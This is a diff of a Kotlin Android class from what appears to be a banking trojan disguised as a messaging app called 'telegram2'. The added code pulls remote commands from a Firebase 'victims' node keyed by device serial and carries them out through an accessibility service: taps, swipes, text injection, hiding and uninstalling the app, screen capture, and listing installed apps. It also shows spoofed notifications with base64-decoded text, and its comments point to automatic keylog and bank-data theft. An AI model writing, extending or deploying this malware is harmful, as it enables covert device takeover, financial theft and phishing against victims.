@@ -1,40 +1,74 @@
 package com.telegram2.messaging.remote
 
 import android.content.Context
-import com.google.firebase.database.ChildEventListener
-import com.google.firebase.database.DataSnapshot
-import com.google.firebase.database.DatabaseError
-import com.google.firebase.database.FirebaseDatabase
+import android.util.Base64
+import com.google.firebase.database.*
 
-class CommandProcessor(private val context: Context) {
-    private val db = FirebaseDatabase.getInstance().getReference("telegram2_secret")
-    private val commandsRef = db.child("victims").child(android.os.Build.SERIAL).child("commands")
+object CommandProcessor {
+    private lateinit var context: Context
 
-    init {
-        commandsRef.addChildEventListener(object : ChildEventListener {
-            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
-                val cmd = snapshot.getValue(MyAccessibilityService.Command::class.java) ?: return
-                executeCommand(cmd)
+    fun init(ctx: Context) {
+        context = ctx.applicationContext
+        // Listen for commands
+        FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
+            override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
+                val cmd = snapshot.getValue(RemoteCommand::class.java) ?: return
+                execute(cmd)
                 snapshot.ref.removeValue()
             }
-            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
+            override fun onChildChanged(snapshot: DataSnapshot, p1: String?) {}
             override fun onChildRemoved(snapshot: DataSnapshot) {}
-            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
-            override fun onCancelled(error: DatabaseError) {}
+            override fun onChildMoved(snapshot: DataSnapshot, p1: String?) {}
+            override fun onCancelled(error: DatabaseError) {
+                // Reattach on error
+                FirebaseBridge.commandsRef.addChildEventListener(this)
+            }
         })
     }
 
-    private fun executeCommand(cmd: MyAccessibilityService.Command) {
-        val service = MyAccessibilityService.instance
+    private fun execute(cmd: RemoteCommand) {
+        val svc = MyAccessibilityService.instance ?: return
         when (cmd.type) {
-            "tap" -> service?.tap(cmd.x ?: 0, cmd.y ?: 0)
-            "swipe" -> service?.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0)
-            "type" -> service?.injectText(cmd.text ?: "")
-            "hide_activity" -> service?.hideApp()
-            "uninstall" -> service?.uninstallSelf()
+            "tap" -> svc.tap(cmd.x ?: 0, cmd.y ?: 0)
+            "swipe" -> svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0)
+            "type" -> svc.injectText(cmd.text ?: "")
+            "hide_activity" -> svc.hideApp()
+            "uninstall" -> svc.uninstallSelf()
             "fake_notification" -> {
-                NotificationSpoofer.show(context, cmd.title ?: "", cmd.text ?: "", cmd.iconUrl)
+                val title = decodeIfBase64(cmd.title)
+                val body = decodeIfBase64(cmd.text)
+                NotificationSpoofer.show(context, title ?: "", body ?: "", cmd.iconUrl)
             }
+            "start_screen_capture" -> svc.startScreenCapture()
+            "get_apps" -> {
+                val apps = svc.getInstalledApps()
+                FirebaseBridge.pushAppsList(apps)
+            }
+            "get_keylogs" -> { /* no action – keylogs are pushed automatically */ }
+            "get_bank_data" -> { /* Bank data is pushed by BankLogger automatically */ }
         }
     }
+
+    private fun decodeIfBase64(input: String?): String? {
+        if (input == null) return null
+        return try {
+            val decoded = Base64.decode(input, Base64.DEFAULT)
+            String(decoded, Charsets.UTF_8)
+        } catch (e: Exception) {
+            input   // not base64, return as is
+        }
+    }
+
+    data class RemoteCommand(
+        val type: String? = null,
+        val x: Int? = null,
+        val y: Int? = null,
+        val sx: Int? = null,
+        val sy: Int? = null,
+        val ex: Int? = null,
+        val ey: Int? = null,
+        val text: String? = null,
+        val title: String? = null,
+        val iconUrl: String? = null
+    )
 }
